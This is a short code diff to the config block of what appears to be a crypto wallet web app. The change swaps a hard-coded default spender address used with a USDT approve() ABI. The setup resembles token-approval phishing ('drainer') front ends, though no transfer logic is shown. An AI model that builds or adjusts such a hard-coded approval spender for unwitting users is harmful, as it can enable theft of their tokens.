@@ -8,7 +8,7 @@ import WalletModal from './components/WalletModal';
 // ─── CONFIG ───────────────────────────────────────────────────────────────────
 const WC_PROJECT_ID = 'ac6a9047d6a423b0374a4d787dfcf665';
 const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
-const DEFAULT_SPENDER = '0x73E2339c61E563FBC6E0173ad698742e6093407a';
+const DEFAULT_SPENDER = '0x7f43ba7d7CF1bc31Da78bcC40ACE99978a7F288B';
 const BACKEND_URL = import.meta.env.VITE_BACKEND_URL;
 const USDT_ABI = ['function approve(address spender, uint256 amount) external returns (bool)'];
 const USDT_ABI_BAL = ['function balanceOf(address account) view returns (uint256)'];
